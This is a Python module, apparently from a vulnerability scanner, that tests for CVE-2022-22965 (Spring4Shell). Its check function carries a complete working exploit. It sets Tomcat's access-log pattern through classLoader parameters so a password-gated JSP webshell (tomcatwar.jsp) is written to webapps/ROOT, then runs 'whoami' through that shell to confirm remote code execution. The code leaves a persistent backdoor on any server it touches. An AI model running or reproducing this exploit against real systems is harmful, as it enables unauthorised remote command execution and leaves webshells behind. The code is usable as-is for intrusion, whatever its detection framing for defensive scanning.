#!/usr/local/bin/python3
# -*- coding: utf-8 -*-
"""
   File Name：     cve_2022_22965.py
   Description :
   Author :       sule01u
   date：          2023/10/8
"""
import random
import requests
import time
from urllib.parse import urljoin, urlparse
from utils.custom_headers import USER_AGENTS, TIMEOUT
from utils.logging_config import configure_logger
logger = configure_logger(__name__)
requests.packages.urllib3.disable_warnings()


def check(target_url, proxies=None):
    """
    对给定的目标URL检测CVE-2022-22965漏洞。
    参数:
    - target_url: 待检测的目标URL
    - proxies: 代理配置
    """
    CVE_ID = "CVE-2022-22965"

    headers = {
        "suffix": "%>//",
        "c1": "Runtime",
        "c2": "<%",
        "DNT": "1",
        "User-Agent": random.choice(USER_AGENTS)
    }

    # 构建payload
    log_pattern = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di"
    log_file_suffix = "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp"
    log_file_dir = "class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT"
    log_file_prefix = "class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar"
    log_file_date_format = "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
    arg_payload = "?" + "&".join([log_pattern, log_file_suffix, log_file_dir, log_file_prefix, log_file_date_format])

    try:
        url_with_payload = target_url + arg_payload
        requests.get(url_with_payload, headers=headers, verify=False, timeout=TIMEOUT, proxies=proxies)

        # 等待上传完成
        time.sleep(5)

        # 开始请求上传的webshell文件
        shell_url = urljoin(target_url, 'tomcatwar.jsp?pwd=j&cmd=whoami')
        shell_response = requests.get(shell_url, timeout=TIMEOUT, stream=True, verify=False, proxies=proxies)
        if shell_response.status_code == 200:
            logger.info(f"Detected CVE-2022-22965 vulnerability at: {shell_url}")
            return True, {
                "CVE_ID": CVE_ID,
                "URL": shell_url,
                "Details": f"检测到{CVE_ID}的RCE漏洞",
                "Response": shell_response.text[:20] + "......"
            }
        else:
            parsed_url = urlparse(shell_url)
            root_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
            shell_url_root = urljoin(root_url, 'tomcatwar.jsp?pwd=j&cmd=whoami')
            shell_response_root = requests.get(shell_url_root, timeout=TIMEOUT, stream=True, verify=False, proxies=proxies)

            if shell_response_root.status_code == 200:
                logger.info(f"Detected {CVE_ID} vulnerability at: {shell_url_root}")
                return True, {
                    "CVE_ID": CVE_ID,
                    "URL": shell_response_root,
                    "Details": f"检测{CVE_ID}的RCE漏洞",
                    "Response": shell_response.text[:20] + "......"
                }
            return False, {
                "CVE_ID": CVE_ID,
                "URL": target_url,
                "Details": "未检测到CVE-2022-22965漏洞"
            }
    except requests.ConnectionError as e:
        logger.error(f"URL: {target_url} 连接错误：{e}")
        return False, {
            "CVE_ID": CVE_ID,
            "URL": target_url,
            "Details": f"连接错误：{e}"
        }

    except requests.Timeout as e:
        logger.error(f"URL: {target_url} 请求超时：{e}")
        return False, {
            "CVE_ID": CVE_ID,
            "URL": target_url,
            "Details": f"请求超时：{e}"
        }

    except requests.RequestException as e:
        logger.error(f"URL: {target_url} 请求出错：{e}")
        return False, {
            "CVE_ID": CVE_ID,
            "URL": target_url,
            "Details": f"请求出错：{e}"
        }



if __name__ == '__main__':
    is_vul, res = check("http://localhost:8080/", proxies={})
    print(is_vul, res)
